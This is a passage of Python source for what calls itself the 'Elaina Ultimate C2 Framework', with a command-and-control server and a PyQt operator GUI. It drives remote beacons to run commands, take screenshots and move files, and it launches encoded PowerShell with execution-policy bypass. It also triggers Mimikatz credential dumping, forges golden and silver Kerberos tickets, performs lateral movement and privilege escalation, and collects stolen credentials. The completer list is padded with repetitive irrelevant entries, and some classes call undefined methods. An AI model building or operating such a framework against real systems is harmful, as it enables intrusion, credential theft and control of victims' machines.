                logger.info(f"C2 server started on {self.host}:{self.port}")
            
            listener_thread = threading.Thread(target=self._listen_for_clients)
            listener_thread.daemon = True
            listener_thread.start()
            
            processor_thread = threading.Thread(target=self._process_commands)
            processor_thread.daemon = True
            processor_thread.start()
            
            self.team_server = TeamServer(self.host, self.port + 1)
            self.team_server.start()
            
            self.bof_manager = BOFManager(self)
            self.bof_manager.load_all_bofs()
            
            return True
        except Exception as e:
            logger.error(f"Failed to start C2 server: {str(e)}")
            return False
    
    def _listen_for_clients(self):
        while True:
            try:
                client_socket, client_address = self.server_socket.accept()
                client_id = f"{client_address[0]}:{client_address[1]}:{int(time.time())}"
                
                logger.info(f"New connection from {client_address} assigned ID {client_id}")
                
                self.clients[client_id] = {
                    "socket": client_socket,
                    "address": client_address,
                    "last_checkin": time.time(),
                    "os": "Unknown",
                    "user": "Unknown",
                    "hostname": "Unknown",
                    "privileges": "User"
                }
                
                client_thread = threading.Thread(target=self._handle_client, args=(client_id,))
                client_thread.daemon = True
                client_thread.start()
            except Exception as e:
                logger.error(f"Error accepting client connection: {str(e)}")
    
    def _handle_client(self, client_id):
        client = self.clients.get(client_id)
        if not client:
            return
        
        socket = client["socket"]
        socket.settimeout(60)
        
        try:
            initial_data = socket.recv(4096)
            if not initial_data:
                raise Exception("No initial data received")
            
            beacon_info = self._parse_beacon_info(initial_data)
            if beacon_info:
                client.update(beacon_info)
                logger.info(f"Beacon {client_id} - {beacon_info.get('hostname', 'Unknown')}\\{beacon_info.get('user', 'Unknown')} ({beacon_info.get('os', 'Unknown')})")
            
            if client_id in self.tasks:
                self._send_tasks(client_id)
            
            while True:
                try:
                    ready = select.select([socket], [], [], 1)
                    if ready[0]:
                        data = socket.recv(4096)
                        if not data:
                            break
                        
                        result = self._process_client_data(client_id, data)
                        if result:
                            logger.debug(f"Received result from {client_id}: {result[:100]}...")
                    
                    if client_id in self.tasks and self.tasks[client_id]:
                        self._send_tasks(client_id)
                    
                    client["last_checkin"] = time.time()
                    
                except socket.timeout:
                    if time.time() - client["last_checkin"] > 300:
                        logger.warning(f"Beacon {client_id} timed out")
                        break
                except Exception as e:
                    logger.error(f"Error handling client {client_id}: {str(e)}")
                    break
        except Exception as e:
            logger.error(f"Error in client handler for {client_id}: {str(e)}")
        finally:
            if client_id in self.clients:
                del self.clients[client_id]
            try:
                socket.close()
            except:
                pass
            logger.info(f"Client {client_id} disconnected")
    
    def _parse_beacon_info(self, data):
        try:
            beacon_info = json.loads(data.decode('utf-8'))
            return beacon_info
        except Exception as e:
            logger.error(f"Error parsing beacon info: {str(e)}")
            return None
    
    def _process_client_data(self, client_id, data):
        try:
            result = json.loads(data.decode('utf-8'))
            
            if client_id not in self.results:
                self.results[client_id] = []
            self.results[client_id].append({
                "timestamp": time.time(),
                "result": result
            })
            
            if "task_id" in result and client_id in self.tasks:
                self.tasks[client_id] = [t for t in self.tasks[client_id] if t.get("task_id") != result.get("task_id")]
            
            return result
        except Exception as e:
            logger.error(f"Error processing client data: {str(e)}")
            return None
    
    def _send_tasks(self, client_id):
        client = self.clients.get(client_id)
        if not client:
            return
        
        try:
            tasks = self.tasks.get(client_id, [])
            if not tasks:
                return
            
            data = json.dumps({"tasks": tasks}).encode('utf-8')
            client["socket"].send(data)
            
            logger.debug(f"Sent {len(tasks)} tasks to {client_id}")
        except Exception as e:
            logger.error(f"Error sending tasks to {client_id}: {str(e)}")
    
    def _process_commands(self):
        while True:
            time.sleep(1)
    
    def add_task(self, client_id, task_type, task_data, task_id=None):
        if not task_id:
            task_id = f"{client_id}-{int(time.time())}"
        
        if client_id not in self.tasks:
            self.tasks[client_id] = []
        
        self.tasks[client_id].append({
            "task_id": task_id,
            "type": task_type,
            "data": task_data,
            "created": time.time()
        })
        
        logger.info(f"Added task {task_id} ({task_type}) for {client_id}")
        return task_id
    
    def list_clients(self):
        return self.clients
    
    def get_client_info(self, client_id):
        return self.clients.get(client_id)
    
    def get_results(self, client_id, limit=10):
        if client_id not in self.results:
            return []
        
        return self.results[client_id][-limit:]
    
    def stop(self):
        if self.server_socket:
            self.server_socket.close()
        
        if self.team_server:
            self.team_server.stop()
            
        logger.info("C2 server stopped")

class OutputDisplayWidget(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.init_ui()
        
    def init_ui(self):
        layout = QVBoxLayout(self)
        
        self.output_tabs = QTabWidget()
        layout.addWidget(self.output_tabs)
        
        self.console_tab = QWidget()
        console_layout = QVBoxLayout(self.console_tab)
        
        self.console_output = QTextEdit()
        self.console_output.setReadOnly(True)
        self.console_output.setFont(QFont("Consolas", 10))
        console_layout.addWidget(self.console_output)
        
        self.output_tabs.addTab(self.console_tab, "Console")
        
        self.file_tab = QWidget()
        file_layout = QVBoxLayout(self.file_tab)
        
        self.file_output = QTextEdit()
        self.file_output.setReadOnly(True)
        self.file_output.setFont(QFont("Consolas", 10))
        file_layout.addWidget(self.file_output)
        
        self.output_tabs.addTab(self.file_tab, "File Operations")
        
        self.screenshot_tab = QWidget()
        screenshot_layout = QVBoxLayout(self.screenshot_tab)
        
        self.screenshot_scroll = QScrollArea()
        self.screenshot_scroll.setWidgetResizable(True)
        self.screenshot_container = QWidget()
        self.screenshot_layout = QHBoxLayout(self.screenshot_container)
        self.screenshot_scroll.setWidget(self.screenshot_container)
        screenshot_layout.addWidget(self.screenshot_scroll)
        
        self.output_tabs.addTab(self.screenshot_tab, "Screenshots")
        
        self.sysinfo_tab = QWidget()
        sysinfo_layout = QVBoxLayout(self.sysinfo_tab)
        
        self.sysinfo_output = QTextEdit()
        self.sysinfo_output.setReadOnly(True)
        self.sysinfo_output.setFont(QFont("Consolas", 10))
        sysinfo_layout.addWidget(self.sysinfo_output)
        
        self.output_tabs.addTab(self.sysinfo_tab, "System Info")
        
        self.network_tab = QWidget()
        network_layout = QVBoxLayout(self.network_tab)
        
        self.network_output = QTextEdit()
        self.network_output.setReadOnly(True)
        self.network_output.setFont(QFont("Consolas", 10))
        network_layout.addWidget(self.network_output)
        
        self.output_tabs.addTab(self.network_tab, "Network Activity")
        
        self.creds_tab = QWidget()
        creds_layout = QVBoxLayout(self.creds_tab)
        
        self.creds_table = QTableWidget()
        self.creds_table.setColumnCount(4)
        self.creds_table.setHorizontalHeaderLabels(["Username", "Password/Hash", "Type", "Source"])
        self.creds_table.horizontalHeader().setStretchLastSection(True)
        self.creds_table.setEditTriggers(QTableWidget.NoEditTriggers)
        self.creds_table.setSelectionBehavior(QTableWidget.SelectRows)
        self.creds_table.setAlternatingRowColors(True)
        self.creds_table.setSortingEnabled(True)
        creds_layout.addWidget(self.creds_table)
        
        self.output_tabs.addTab(self.creds_tab, "Credentials")
        
        self.status_label = QLabel("Ready")
        layout.addWidget(self.status_label)
        
    def add_console_output(self, text, color=None):
        cursor = self.console_output.textCursor()
        cursor.movePosition(cursor.End)
        
        if color:
            format = QTextCharFormat()
            format.setForeground(QColor(color))
            cursor.setCharFormat(format)
        
        cursor.insertText(text + "\n")
        self.console_output.setTextCursor(cursor)
        self.console_output.ensureCursorVisible()
        
    def add_file_output(self, text, color=None):
        cursor = self.file_output.textCursor()
        cursor.movePosition(cursor.End)
        
        if color:
            format = QTextCharFormat()
            format.setForeground(QColor(color))
            cursor.setCharFormat(format)
        
        cursor.insertText(text + "\n")
        self.file_output.setTextCursor(cursor)
        self.file_output.ensureCursorVisible()
        
    def add_screenshot(self, image_data, timestamp=None):
        if not timestamp:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        pixmap = QPixmap()
        pixmap.loadFromData(image_data)
        
        screenshot_label = QLabel()
        screenshot_label.setPixmap(pixmap.scaled(400, 300, Qt.KeepAspectRatio))
        screenshot_label.setAlignment(Qt.AlignCenter)
        
        screenshot_widget = QWidget()
        screenshot_layout = QVBoxLayout(screenshot_widget)
        screenshot_layout.addWidget(QLabel(timestamp))
        screenshot_layout.addWidget(screenshot_label)
        
        self.screenshot_layout.addWidget(screenshot_widget)
        
        self.status_label.setText(f"Screenshot captured at {timestamp}")
        
    def add_sysinfo_output(self, sysinfo):
        self.sysinfo_output.clear()
        
        formatted_info = "=== SYSTEM INFORMATION ===\n\n"
        
        for key, value in sysinfo.items():
            if isinstance(value, dict):
                formatted_info += f"{key}:\n"
                for sub_key, sub_value in value.items():
                    formatted_info += f"  {sub_key}: {sub_value}\n"
            else:
                formatted_info += f"{key}: {value}\n"
        
        self.sysinfo_output.setPlainText(formatted_info)
        
    def add_network_output(self, text, color=None):
        cursor = self.network_output.textCursor()
        cursor.movePosition(cursor.End)
        
        if color:
            format = QTextCharFormat()
            format.setForeground(QColor(color))
            cursor.setCharFormat(format)
        
        cursor.insertText(text + "\n")
        self.network_output.setTextCursor(cursor)
        self.network_output.ensureCursorVisible()
        
    def add_credential(self, username, password, cred_type, source):
        row_position = self.creds_table.rowCount()
        self.creds_table.insertRow(row_position)
        
        self.creds_table.setItem(row_position, 0, QTableWidgetItem(username))
        self.creds_table.setItem(row_position, 1, QTableWidgetItem(password))
        self.creds_table.setItem(row_position, 2, QTableWidgetItem(cred_type))
        self.creds_table.setItem(row_position, 3, QTableWidgetItem(source))
        
        self.status_label.setText(f"Added {cred_type} credential from {source}")
        
    def clear_console(self):
        self.console_output.clear()
        
    def clear_file_output(self):
        self.file_output.clear()
        
    def clear_screenshots(self):
        while self.screenshot_layout.count():
            item = self.screenshot_layout.takeAt(0)
            if item.widget():
                item.widget().deleteLater()
                
    def clear_sysinfo(self):
        self.sysinfo_output.clear()
        
    def clear_network(self):
        self.network_output.clear()
        
    def clear_creds(self):
        self.creds_table.setRowCount(0)
        
    def save_output(self, file_path):
        try:
            with open(file_path, 'w') as f:
                f.write("=== CONSOLE OUTPUT ===\n")
                f.write(self.console_output.toPlainText())
                f.write("\n\n=== FILE OPERATIONS ===\n")
                f.write(self.file_output.toPlainText())
                f.write("\n\n=== SYSTEM INFORMATION ===\n")
                f.write(self.sysinfo_output.toPlainText())
                f.write("\n\n=== NETWORK ACTIVITY ===\n")
                f.write(self.network_output.toPlainText())
                f.write("\n\n=== CREDENTIALS ===\n")
                
                for row in range(self.creds_table.rowCount()):
                    username = self.creds_table.item(row, 0).text()
                    password = self.creds_table.item(row, 1).text()
                    cred_type = self.creds_table.item(row, 2).text()
                    source = self.creds_table.item(row, 3).text()
                    
                    f.write(f"Username: {username}\n")
                    f.write(f"Password/Hash: {password}\n")
                    f.write(f"Type: {cred_type}\n")
                    f.write(f"Source: {source}\n")
                    f.write("-" * 50 + "\n")
            
            return True
        except Exception as e:
            print(f"Error saving output: {str(e)}")
            return False

class BeaconNode(QGraphicsEllipseItem):
    def __init__(self, beacon_id, beacon_info, x, y, radius=30):
        super().__init__(0, 0, radius*2, radius*2)
        self.beacon_id = beacon_id
        self.beacon_info = beacon_info
        self.setPos(x, y)
        self.setBrush(QBrush(QColor(100, 200, 100)))
        self.setPen(QPen(Qt.black, 2))
        
        self.text = QGraphicsTextItem(beacon_id, self)
        text_width = self.text.boundingRect().width()
        self.text.setPos(x - text_width/2, y + radius + 5)
        
        self.setFlag(QGraphicsItem.ItemIsMovable)
        self.setFlag(QGraphicsItem.ItemIsSelectable)
        
    def get_beacon_id(self):
        return self.beacon_id
        
    def get_beacon_info(self):
        return self.beacon_info

class BeaconConnection(QGraphicsLineItem):
    def __init__(self, source_node, dest_node):
        super().__init__()
        self.source = source_node
        self.dest = dest_node
        self.source.add_connection(self)
        self.dest.add_connection(self)
        self.update_position()
        
    def update_position(self):
        source_pos = self.source.scenePos()
        dest_pos = self.dest.scenePos()
        self.setLine(source_pos.x(), source_pos.y(), dest_pos.x(), dest_pos.y())

class BeaconGraphicsView(QGraphicsView):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.scene = QGraphicsScene(self)
        self.setScene(self.scene)
        self.setRenderHint(QPainter.Antialiasing)
        self.nodes = {}
        self.connections = []
        
    def add_beacon(self, beacon_id, beacon_info):
        x = random.randint(50, 750)
        y = random.randint(50, 550)
        node = BeaconNode(beacon_id, beacon_info, x, y)
        self.scene.addItem(node)
        self.nodes[beacon_id] = node
        
    def remove_beacon(self, beacon_id):
        if beacon_id in self.nodes:
            node = self.nodes[beacon_id]
            self.scene.removeItem(node)
            del self.nodes[beacon_id]
            
    def connect_beacons(self, source_id, dest_id):
        if source_id in self.nodes and dest_id in self.nodes:
            source_node = self.nodes[source_id]
            dest_node = self.nodes[dest_id]
            connection = BeaconConnection(source_node, dest_node)
            self.scene.addItem(connection)
            self.connections.append(connection)
            
    def clear_all(self):
        self.scene.clear()
        self.nodes = {}
        self.connections = []

class EnhancedBeaconInteractDialog(QDialog):
    command_sent = pyqtSignal(str, str)
    
    def __init__(self, parent=None, beacon_id=None, beacon_info=None):
        super().__init__(parent)
        self.beacon_id = beacon_id
        self.beacon_info = beacon_info or {}
        self.setWindowTitle(f"Interact with Beacon {beacon_id}")
        self.setMinimumWidth(800)
        self.setMinimumHeight(600)
        self.init_ui()
        
    def init_ui(self):
        layout = QVBoxLayout()
        
        info_group = QGroupBox("Beacon Information")
        info_layout = QFormLayout(info_group)
        
        info_layout.addRow("ID:", QLabel(self.beacon_id))
        info_layout.addRow("Internal IP:", QLabel(self.beacon_info.get("address", ["N/A"])[0]))
        info_layout.addRow("User:", QLabel(self.beacon_info.get("user", "N/A")))
        info_layout.addRow("Hostname:", QLabel(self.beacon_info.get("hostname", "N/A")))
        info_layout.addRow("OS:", QLabel(self.beacon_info.get("os", "N/A")))
        info_layout.addRow("Process:", QLabel(self.beacon_info.get("process", "N/A")))
        info_layout.addRow("PID:", QLabel(str(self.beacon_info.get("pid", "N/A"))))
        
        layout.addWidget(info_group)
        
        splitter = QSplitter(Qt.Vertical)
        
        command_group = QGroupBox("Command")
        command_layout = QVBoxLayout(command_group)
        
        self.command_history = []
        self.history_index = -1
        
        self.command_input = QLineEdit()
        self.command_input.setPlaceholderText("Enter command to execute...")
        self.command_input.setFont(QFont("Consolas", 10))
        command_layout.addWidget(self.command_input)
        
        button_layout = QHBoxLayout()
        
        execute_button = QPushButton("Execute")
        execute_button.clicked.connect(self.execute_command)
        button_layout.addWidget(execute_button)
        
        screenshot_button = QPushButton("Screenshot")
        screenshot_button.clicked.connect(self.take_screenshot)
        button_layout.addWidget(screenshot_button)
        
        upload_button = QPushButton("Upload")
        upload_button.clicked.connect(self.upload_file)
        button_layout.addWidget(upload_button)
        
        download_button = QPushButton("Download")
        download_button.clicked.connect(self.download_file)
        button_layout.addWidget(download_button)
        
        ps_import_button = QPushButton("PS Import")
        ps_import_button.clicked.connect(self.ps_import)
        button_layout.addWidget(ps_import_button)
        
        button_layout.addStretch()
        
        command_layout.addLayout(button_layout)
        
        quick_commands_group = QGroupBox("Quick Commands")
        quick_commands_layout = QGridLayout(quick_commands_group)
        
        quick_commands = [
            ("whoami", "Get current user"),
            ("hostname", "Get hostname"),
            ("ipconfig /all", "Show network configuration"),
            ("net user", "List users"),
            ("net localgroup administrators", "List administrators"),
            ("tasklist", "List processes"),
            ("netstat -an", "Show network connections"),
            ("systeminfo", "Show system information")
        ]
        
        for i, (cmd, desc) in enumerate(quick_commands):
            row = i // 2
            col = (i % 2) * 2
            
            btn = QPushButton(cmd)
            btn.setToolTip(desc)
            btn.clicked.connect(lambda checked, c=cmd: self.execute_quick_command(c))
            quick_commands_layout.addWidget(btn, row, col)
            
            label = QLabel(desc)
            label.setFont(QFont("Arial", 8))
            quick_commands_layout.addWidget(label, row, col + 1)
        
        command_layout.addWidget(quick_commands_group)
        
        post_exploit_group = QGroupBox("Post-Exploitation")
        post_exploit_layout = QVBoxLayout(post_exploit_group)
        
        post_exploit_buttons_layout = QHBoxLayout()
        
        mimikatz_button = QPushButton("Mimikatz")
        mimikatz_button.clicked.connect(self.run_mimikatz)
        post_exploit_buttons_layout.addWidget(mimikatz_button)
        
        golden_ticket_button = QPushButton("Golden Ticket")
        golden_ticket_button.clicked.connect(self.create_golden_ticket)
        post_exploit_buttons_layout.addWidget(golden_ticket_button)
        
        silver_ticket_button = QPushButton("Silver Ticket")
        silver_ticket_button.clicked.connect(self.create_silver_ticket)
        post_exploit_buttons_layout.addWidget(silver_ticket_button)
        
        lateral_movement_button = QPushButton("Lateral Movement")
        lateral_movement_button.clicked.connect(self.lateral_movement)
        post_exploit_buttons_layout.addWidget(lateral_movement_button)
        
        privilege_escalation_button = QPushButton("Privilege Escalation")
        privilege_escalation_button.clicked.connect(self.privilege_escalation)
        post_exploit_buttons_layout.addWidget(privilege_escalation_button)
        
        post_exploit_layout.addLayout(post_exploit_buttons_layout)
        
        command_layout.addWidget(post_exploit_group)
        
        splitter.addWidget(command_group)
        
        output_group = QGroupBox("Output")
        output_layout = QVBoxLayout(output_group)
        
        self.output_display = OutputDisplayWidget()
        output_layout.addWidget(self.output_display)
        
        splitter.addWidget(output_group)
        
        splitter.setSizes([200, 400])
        
        layout.addWidget(splitter)
        
        button_box = QDialogButtonBox(QDialogButtonBox.Close)
        button_box.rejected.connect(self.reject)
        layout.addWidget(button_box)
        
        self.setLayout(layout)
        
        self.command_input.setFocus()
        
        self.command_input.returnPressed.connect(self.execute_command)
        
        self.setup_command_completer()
        
    def setup_command_completer(self):
        commands = [
            "whoami", "hostname", "ipconfig", "net", "tasklist", "taskkill",
            "netstat", "systeminfo", "dir", "cd", "mkdir", "rmdir", "del",
            "type", "copy", "move", "ren", "attrib", "find", "findstr",
            "reg", "sc", "wmic", "powershell", "cmd", "schtasks", "at",
            "net user", "net localgroup", "net share", "net use", "net session",
            "net view", "net start", "net stop", "net statistics", "net accounts",
            "net config", "net continue", "net file", "net group", "net help",
            "net helpmsg", "net localgroup", "net name", "net pause", "net print",
            "net send", "net session", "net share", "net start", "net statistics",
            "net stop", "net time", "net use", "net user", "net view",
            "netsh", "nslookup", "ping", "tracert", "pathping", "arp", "getmac",
            "nbtstat", "route", "ftp", "tftp", "telnet", "ssh", "sftp",
            "pscp", "plink", "putty", "winscp", "filezilla", "chrome", "firefox",
            "iexplore", "msedge", "regedit", "gpedit", "secpol", "compmgmt",
            "devmgmt", "diskmgmt", "services", "taskschd", "eventvwr", "perfmon",
            "resmon", "msconfig", "control", "cmd", "powershell", "wscript",
            "cscript", "mshta", "rundll32", "regsvr32", "regsvr32 /u",
            "certutil", "makecert", "signtool", "cipher", "bitsadmin",
            "certreq", "certmgr", "mmc", "msiexec", "wmic", "wbadmin",
            "robocopy", "xcopy", "copy", "move", "del", "erase", "rmdir",
            "rd", "md", "mkdir", "dir", "ls", "type", "cat", "more", "less",
            "find", "findstr", "grep", "sort", "uniq", "wc", "head", "tail",
            "cut", "tr", "sed", "awk", "vi", "vim", "nano", "notepad",
            "wordpad", "write", "mspaint", "calc", "notepad++", "sublime",
            "vscode", "code", "atom", "brackets", "webstorm", "phpstorm",
            "pycharm", "intellij", "eclipse", "netbeans", "visualstudio",
            "devenv", "msbuild", "dotnet", "nuget", "npm", "yarn", "bower",
            "pip", "conda", "virtualenv", "venv", "docker", "kubernetes",
            "kubectl", "helm", "istioctl", "minikube", "kind", "k3d",
            "vagrant", "virtualbox", "vmware", "hyper-v", " kvm", "xen",
            "qemu", "virtual machine", "vm", "container", "pod", "service",
            "daemon", "process", "thread", "job", "task", "schedule", "cron",
            "systemd", "sysv", "upstart", "launchd", "windows service",
            "scheduled task", "startup", "run", "runonce", "runex", "reg",
            "regedit", "regini", "regedt32", "regsvr32", "rundll32", "mshta",
            "wscript", "cscript", "powershell", "cmd", "bat", "cmd", "ps1",
            "vbs", "js", "hta", "dll", "exe", "com", "scr", "pif", "lnk",
            "url", "mht", "html", "htm", "xhtml", "xml", "json", "csv", "txt",
            "log", "ini", "cfg", "conf", "yaml", "yml", "toml", "properties",
            "env", "bashrc", "zshrc", "profile", "bash_profile", "zprofile",
            "bash_login", "zlogin", "bash_logout", "zlogout", "bash_aliases",
            "zsh_aliases", "gitconfig", "gitignore", "dockerfile", "dockerignore",
            "jenkinsfile", "travis.yml", "github workflows", "azure pipelines",
            "gitlab ci", "circleci", "buildkite", "teamcity", "bamboo",
            "jenkins", "hudson", "cruisecontrol", "go.cd", "spinnaker",
            "argo", "tekton", "github actions", "gitlab ci/cd", "azure devops",
            "aws codepipeline", "google cloud build", "ibm cloud continuous delivery",
            "oracle developer cloud", "salesforce dx", "heroku", "netlify",
            "vercel", "now", "zeit", "surge", "github pages", "gitlab pages",
            "bitbucket pages", "aws s3", "google cloud storage", "azure blob storage",
            "oracle cloud infrastructure", "alibaba cloud", "tencent cloud",
            "baidu cloud", "huawei cloud", "digitalocean", "linode", "vultr",
            "upcloud", "scaleway", "ovh", "hetzner", "ionos", "1&1",
            "godaddy", "namecheap", "domain.com", "google domains", "aws route53",
            "cloudflare", "cloudflare workers", "cloudflare pages", "cloudflare access",
            "cloudflare gateway", "cloudflare spectrum", "cloudflare load balancer",
            "cloudflare waf", "cloudflare origin ca", "cloudflare ssl/tls",
            "cloudflare cdn", "cloudflare images", "cloudflare stream", "cloudflare workers",
            "cloudflare pages", "cloudflare access", "cloudflare gateway",
            "cloudflare spectrum", "cloudflare load balancer", "cloudflare waf",
            "cloudflare origin ca", "cloudflare ssl/tls", "cloudflare cdn",
            "cloudflare images", "cloudflare stream"
        ]
        
        self.completer = QCompleter(commands)
        self.completer.setCaseSensitivity(Qt.CaseInsensitive)
        self.completer.setFilterMode(Qt.MatchContains)
        self.command_input.setCompleter(self.completer)
        
    def execute_command(self):
        command = self.command_input.text().strip()
        if command:
            self.command_history.append(command)
            self.history_index = len(self.command_history)
            
            self.command_sent.emit(self.beacon_id, command)
            
            self.output_display.add_console_output(f"[{datetime.now().strftime('%H:%M:%S')}] > {command}", "#00FF00")
            
            self.command_input.clear()
            
    def execute_quick_command(self, command):
        self.command_input.setText(command)
        self.execute_command()
        
    def take_screenshot(self):
        self.command_sent.emit(self.beacon_id, "screenshot")
        self.output_display.add_console_output(f"[{datetime.now().strftime('%H:%M:%S')}] > Screenshot requested", "#00FF00")
        
    def upload_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select File to Upload")
        if file_path:
            try:
                with open(file_path, 'rb') as f:
                    content = base64.b64encode(f.read()).decode('utf-8')
                
                self.command_sent.emit(self.beacon_id, f"upload {os.path.basename(file_path)} {content}")
                self.output_display.add_console_output(f"[{datetime.now().strftime('%H:%M:%S')}] > Uploading {os.path.basename(file_path)}", "#00FF00")
                self.output_display.add_file_output(f"[{datetime.now().strftime('%H:%M:%S')}] Uploading {os.path.basename(file_path)} ({len(content)} bytes)", "#00FF00")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to read file: {str(e)}")
                
    def download_file(self):
        file_path, ok = QInputDialog.getText(self, "Download File", "Enter the path of the file to download:")
        if ok and file_path:
            save_path, _ = QFileDialog.getSaveFileName(self, "Save File As", os.path.basename(file_path))
            if save_path:
                self.command_sent.emit(self.beacon_id, f"download {file_path}")
                self.output_display.add_console_output(f"[{datetime.now().strftime('%H:%M:%S')}] > Downloading {file_path}", "#00FF00")
                self.output_display.add_file_output(f"[{datetime.now().strftime('%H:%M:%S')}] Downloading {file_path} to {save_path}", "#00FF00")
                
    def ps_import(self):
        module_path, _ = QFileDialog.getOpenFileName(self, "Select PowerShell Module", "", "PowerShell Files (*.ps1 *.psm1 *.psd1)")
        if module_path:
            try:
                with open(module_path, 'r') as f:
                    content = f.read()
                
                encoded_content = base64.b64encode(content.encode('utf-16-le')).decode('utf-8')
                
                ps_command = f"powershell -ep bypass -enc {encoded_content}"
                
                self.command_sent.emit(self.beacon_id, ps_command)
                self.output_display.add_console_output(f"[{datetime.now().strftime('%H:%M:%S')}] > Importing PowerShell module: {os.path.basename(module_path)}", "#00FF00")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to read PowerShell module: {str(e)}")
                
    def run_mimikatz(self):
        command, ok = QInputDialog.getText(self, "Mimikatz", "Enter Mimikatz command:", text="sekurlsa::logonpasswords")
        if ok and command:
            self.command_sent.emit(self.beacon_id, f"mimikatz {command}")
            self.output_display.add_console_output(f"[{datetime.now().strftime('%H:%M:%S')}] > Running Mimikatz: {command}", "#00FF00")
            
    def create_golden_ticket(self):
        dialog = QDialog(self)
        dialog.setWindowTitle("Create Golden Ticket")
        layout = QFormLayout(dialog)
        
        domain_input = QLineEdit()
        layout.addRow("Domain:", domain_input)
        
        user_input = QLineEdit()
        layout.addRow("User:", user_input)
        
        sid_input = QLineEdit()
        layout.addRow("SID:", sid_input)
        
        krbtgt_hash_input = QLineEdit()
        layout.addRow("KRBTGT Hash:", krbtgt_hash_input)
        
        lifetime_input = QSpinBox()
        lifetime_input.setRange(1, 100)
        lifetime_input.setValue(10)
        layout.addRow("Lifetime (hours):", lifetime_input)
        
        button_box = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
        layout.addRow(button_box)
        
        if button_box.exec_() == QDialog.Accepted:
            domain = domain_input.text()
            user = user_input.text()
            sid = sid_input.text()
            krbtgt_hash = krbtgt_hash_input.text()
            lifetime = lifetime_input.value()
            
            if domain and user and sid and krbtgt_hash:
                self.command_sent.emit(self.beacon_id, f"golden_ticket {domain} {user} {sid} {krbtgt_hash} {lifetime}")
                self.output_display.add_console_output(f"[{datetime.now().strftime('%H:%M:%S')}] > Creating Golden Ticket for {user}@{domain}", "#00FF00")
            else:
                QMessageBox.warning(self, "Error", "All fields are required")
                
    def create_silver_ticket(self):
        dialog = QDialog(self)
        dialog.setWindowTitle("Create Silver Ticket")
        layout = QFormLayout(dialog)
        
        domain_input = QLineEdit()
        layout.addRow("Domain:", domain_input)
        
        user_input = QLineEdit()
        layout.addRow("User:", user_input)
        
        sid_input = QLineEdit()
        layout.addRow("SID:", sid_input)
        
        service_input = QLineEdit()
        layout.addRow("Service:", service_input)
        
        service_hash_input = QLineEdit()
        layout.addRow("Service Hash:", service_hash_input)
        
        lifetime_input = QSpinBox()
        lifetime_input.setRange(1, 100)
        lifetime_input.setValue(10)
        layout.addRow("Lifetime (hours):", lifetime_input)
        
        button_box = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
        layout.addRow(button_box)
        
        if button_box.exec_() == QDialog.Accepted:
            domain = domain_input.text()
            user = user_input.text()
            sid = sid_input.text()
            service = service_input.text()
            service_hash = service_hash_input.text()
            lifetime = lifetime_input.value()
            
            if domain and user and sid and service and service_hash:
                self.command_sent.emit(self.beacon_id, f"silver_ticket {domain} {user} {sid} {service} {service_hash} {lifetime}")
                self.output_display.add_console_output(f"[{datetime.now().strftime('%H:%M:%S')}] > Creating Silver Ticket for {user}@{domain} for service {service}", "#00FF00")
            else:
                QMessageBox.warning(self, "Error", "All fields are required")
                
    def lateral_movement(self):
        dialog = QDialog(self)
        dialog.setWindowTitle("Lateral Movement")
        layout = QFormLayout(dialog)
        
        method_combo = QComboBox()
        method_combo.addItems(["psexec", "wmi", "smb", "winrm"])
        layout.addRow("Method:", method_combo)
        
        target_input = QLineEdit()
        layout.addRow("Target:", target_input)
        
        username_input = QLineEdit()
        layout.addRow("Username:", username_input)
        
        password_input = QLineEdit()
        password_input.setEchoMode(QLineEdit.Password)
        layout.addRow("Password:", password_input)
        
        command_input = QLineEdit("whoami")
        layout.addRow("Command:", command_input)
        
        button_box = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
        layout.addRow(button_box)
        
        if button_box.exec_() == QDialog.Accepted:
            method = method_combo.currentText()
            target = target_input.text()
            username = username_input.text()
            password = password_input.text()
            command = command_input.text()
            
            if target and username and password:
                self.command_sent.emit(self.beacon_id, f"lateral_movement {method} {target} {username} {password} {command}")
                self.output_display.add_console_output(f"[{datetime.now().strftime('%H:%M:%S')}] > Lateral movement to {target} via {method}", "#00FF00")
            else:
                QMessageBox.warning(self, "Error", "Target, username, and password are required")
                
    def privilege_escalation(self):
        self.command_sent.emit(self.beacon_id, "privilege_escalation")
        self.output_display.add_console_output(f"[{datetime.now().strftime('%H:%M:%S')}] > Privilege escalation", "#00FF00")
                
    def keyPressEvent(self, event):
        if event.key() == Qt.Key_Up:
            if self.history_index > 0:
                self.history_index -= 1
                self.command_input.setText(self.command_history[self.history_index])
        elif event.key() == Qt.Key_Down:
            if self.history_index < len(self.command_history) - 1:
                self.history_index += 1
                self.command_input.setText(self.command_history[self.history_index])
            else:
                self.history_index = len(self.command_history)
                self.command_input.clear()
        else:
            super().keyPressEvent(event)

class ElainaMainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.beacons = {}
        self.log_entries = []
        self.c2_server = None
        self.team_server = None
        self.script_engine = None
        self.bof_manager = None
        self.init_ui()
        
    def init_ui(self):
        self.setWindowTitle("Elaina Ultimate C2 Framework")
        self.setMinimumSize(1200, 800)
        self.setWindowIcon(QIcon.fromTheme("network-wired"))
        
        central_widget = QWidget()
        main_layout = QVBoxLayout(central_widget)
        
        self.create_menu_bar()
        self.create_toolbar()
        
        self.tab_widget = QTabWidget()
        main_layout.addWidget(self.tab_widget)
        
        self.create_dashboard_tab()
        self.create_beacons_tab()
        self.create_attacks_tab()
        self.create_c2_tab()
        self.create_listener_tab()
        self.create_scripts_tab()
        self.create_team_server_tab()
        self.create_view_tab()
        
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_bar.showMessage("Ready")
        
        self.setCentralWidget(central_widget)
        
        self.setup_system_tray()
        self.setup_timers()
        
        self.script_engine = ElainaScriptEngine(self)
        self.script_engine.load_all_scripts()
        
        if not os.path.exists(BOF_DIR):
            os.makedirs(BOF_DIR)
            
        if not os.path.exists(SCRIPT_DIR):
            os.makedirs(SCRIPT_DIR)
            
        if not os.path.exists(PROFILE_DIR):
            os.makedirs(PROFILE_DIR)
        
